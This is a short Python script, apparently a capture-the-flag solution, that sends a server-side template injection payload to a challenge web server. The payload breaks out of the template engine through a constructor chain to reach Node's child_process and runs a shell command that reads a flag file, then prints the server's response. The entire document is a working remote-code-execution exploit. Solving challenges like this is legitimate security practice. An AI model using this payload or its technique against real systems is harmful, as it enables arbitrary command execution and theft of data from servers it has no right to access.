import requests

url = "http://chal1.gryphons.sg:8002/"

payload = "{{ range.constructor('return process')().mainModule.require('child_process').execSync('cat flags/part1.txt').toString() }}"

res = requests.post(f'{url}/submit', data={'name': payload})

print(res.text[res.text.find("Halo"):])